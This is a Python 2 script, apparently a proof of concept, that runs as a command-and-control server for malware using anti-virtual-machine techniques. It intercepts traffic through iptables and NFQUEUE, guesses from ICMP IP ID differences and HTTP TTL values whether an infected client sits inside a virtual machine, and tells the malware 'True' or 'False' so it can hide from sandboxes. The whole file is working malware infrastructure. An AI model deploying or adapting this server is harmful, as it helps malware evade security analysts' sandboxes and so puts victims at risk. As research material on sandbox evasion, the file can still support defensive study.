#!/usr/bin/python
"""
C2.py: Functions as a C&C server for malwares that use Anti VM techniques
that are based on virtual NAT behavior.
"""

from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)
from scapy.sendrecv import send
from scapy import route
from scapy.layers.inet import TCP, IP, ICMP, Raw
from os import system
from netfilterqueue import NetfilterQueue
from random import randint
from re import match

SYN = 0x02


class MalwareClient(object):
    """
    Malware that initiated connection
    """
    def __init__(self, src_ip, client_os, last_ip_id, is_seen_ping):
        self.src_ip = src_ip
        self.client_os = client_os
        self.last_ip_id = last_ip_id
        self.is_seen_ping = is_seen_ping

    def set_os(self, new_client_os):
        """
        Set malware OS.
        :param new_client_os: New OS
        """
        self.client_os = new_client_os

    def get_os(self):
        """
        Get malware OS.
        :return: Malware OS name.
        """
        return self.client_os

    def set_ip_id(self, ip_id):
        """
        Set last IP ID.
        :param ip_id: New IP ID.
        """
        self.last_ip_id = ip_id

    def set_is_seen_ping(self, value):
        """
        Set to True if we already seen the first ping else False.
        :param value:
        """
        self.is_seen_ping = value

    def is_vm_by_ip_id(self, ip_id):
        """
        Check if malware is on VM by crossing information received from him
        about OS and the difference between first ping IP ID and the second.
        :param ip_id: Second ping IP ID.
        :return: True if VM else False.
        """
        if 'Windows' in self.client_os and abs(ip_id - self.last_ip_id) == 1:
            return False
        elif 'Linux' in self.client_os and abs(ip_id - self.last_ip_id) != 1:
            return False
        else:
            return True

    def is_vm_by_ttl(self, ttl):
        """
        Check if malware is on VM by crossing information received from him
        about OS and the TTL of HTTP GET Request.
        :param ttl: TTL of HTTP GET Request.
        :return: True if VM else False.
        """
        if self.client_os == 'Windows' and ttl == 128:
            return False
        elif self.client_os == 'Linux' and ttl == 64:
            return False
        else:
            return True


def get_client_os_from_icmp_payload(scapy_packet):
    """
    The malware sends local OS name as ping pattern so we check if it contains
    known OS name and return it.
    :param scapy_packet: ICMP scapy packet to check.
    :return: OS name.
    """
    client_os = scapy_packet[Raw].load
    if 'Windows' in client_os:
        return 'Windows'
    elif 'Linux' in client_os:
        return 'Linux'
    else:
        return 'Undefined'


def http_filter(p):
    """
    Checks if this is HTTP Request packet.

    :type p: Packet
    :param p: Packet to check.
    :return: Returns true if HTTP Request packet, else false.
    """
    return TCP in p and Raw in p and (str(p[Raw]).startswith('GET') or
                                      str(p[Raw]).startswith('POST'))


def calc_next_ack(scapy_packet):
    """
    Calculates next acknowledgment number.

    :param scapy_packet: Some scapy packet.
    :return: Next acknowledgment number.
    """
    ip_total_len = len(scapy_packet[IP])
    ip_header_len = scapy_packet[IP].ihl * 32 / 8
    tcp_header_len = scapy_packet[TCP].dataofs * 32 / 8
    tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len
    return scapy_packet[TCP].seq + tcp_seg_len


def get_user_agent(raw):
    """
    Extracts user agent form raw part of some packet.

    :type raw: string
    :param raw: Raw part of some packet as string.
    :return: Returns User-Agent.
    """
    user_agent = raw.split('User-Agent: ')[1]
    user_agent = user_agent.split('\r\n')[0]
    return user_agent


def get_os_from_user_agent(user_agent):
    """
    Extracts OS info of the packet source.

    :type user_agent: string
    :param user_agent: User-Agent string that contains OS info.
    :return: OS name and it's version.
    """
    match_result = match(r'.*?\((.*?)\).*', user_agent)
    full_os = match_result.group(1)
    full_os = full_os.lower()
    if 'linux' in full_os:
        return 'Linux'
    if 'windows' in full_os:
        return 'Windows'


def handle_packet(pkt):
    """
    Apply packet handling logic.

    :param pkt: Received packet from network.
    """
    scapy_packet = IP(pkt.get_payload())
    src_ip = scapy_packet[IP].src
    # Check if ICMP request packet
    if (ICMP in scapy_packet and
            scapy_packet[ICMP].type == 8 and
            Raw in scapy_packet):
        # If new malware register it.
        if src_ip not in malwares:
            client_os = get_client_os_from_icmp_payload(scapy_packet)
            malwares[src_ip] = MalwareClient(src_ip,
                                             client_os,
                                             scapy_packet[IP].id,
                                             False)
        mal = malwares[src_ip]
        # Check if this is second ping
        if mal.is_seen_ping:
            # Check if malware runs inside VM by two pings IP IDs.
            if mal.is_vm_by_ip_id(scapy_packet[IP].id):
                response = "True"
            else:
                response = "False"
            # Update last received IP ID.
            mal.set_ip_id(scapy_packet[IP].id)
            mal.set_is_seen_ping(False)
            # Return answer to the malware.
            cmd = (IP(dst=scapy_packet[IP].src) /
                   ICMP(type=0,
                        code=0,
                        id=scapy_packet[ICMP].id,
                        seq=scapy_packet[ICMP].seq) / response)
            send(cmd)
            print 'Drop'
            pkt.drop()
        else:
            # Update last received IP ID.
            mal.set_ip_id(scapy_packet[IP].id)
            mal.set_is_seen_ping(True)
            # Drop first ping
            print 'Drop'
            pkt.drop()
    # Check if TCP SYN packet
    elif (TCP in scapy_packet and scapy_packet[TCP].flags & SYN and
            scapy_packet[TCP].dport == 80):
        next_ack = scapy_packet.seq + 1
        init_seq = randint(0, 4294967295)
        syn_ack = IP(src=scapy_packet.dst,
                     dst=scapy_packet.src)
        syn_ack /= TCP(sport=scapy_packet.dport,
                       dport=scapy_packet.sport,
                       flags="SA", seq=init_seq, ack=next_ack)
        send(syn_ack)
        print "Received SYN, answered with SYN/ACK"
        pkt.drop()
    # Check if HTTP GET Request.
    elif http_filter(scapy_packet):
        # If new malware register it.
        if src_ip not in malwares:
            user_agent = get_user_agent(scapy_packet[Raw].load)
            client_os = get_os_from_user_agent(user_agent)
            print client_os
            malwares[src_ip] = MalwareClient(src_ip,
                                             client_os,
                                             scapy_packet[IP].id,
                                             False)
        mal = malwares[src_ip]
        # Check if malware runs inside VM by packet TTL.
        if mal.is_vm_by_ttl(scapy_packet[IP].ttl):
            response = "True"
        else:
            response = "False"
        # Return an answer with FA packet.
        next_seq = scapy_packet[TCP].ack
        next_ack = calc_next_ack(scapy_packet)
        res_pkt = IP(src=scapy_packet.dst, dst=scapy_packet.src)
        res_pkt /= TCP(sport=scapy_packet.dport, dport=scapy_packet.sport,
                       flags="FPA", seq=next_seq, ack=next_ack)
        res_pkt /= 'HTTP/1.1 403 Forbidden\r\n' \
                   'Connection: close\r\n'\
                   'Content-Type: text/html;charset=iso-8859-1\r\n\r\n%s' \
                   % response
        send(res_pkt)
        pkt.drop()
    else:
        print 'Accept'
        pkt.accept()


if __name__ == '__main__':
    system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
    system('iptables -A INPUT -j NFQUEUE --queue-num 1')
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, handle_packet)
    malwares = {}
    try:
        print 'C&C Running...'
        nfqueue.run()
    except KeyboardInterrupt:
        system('iptables -F')
        system('iptables -X')
        nfqueue.unbind()
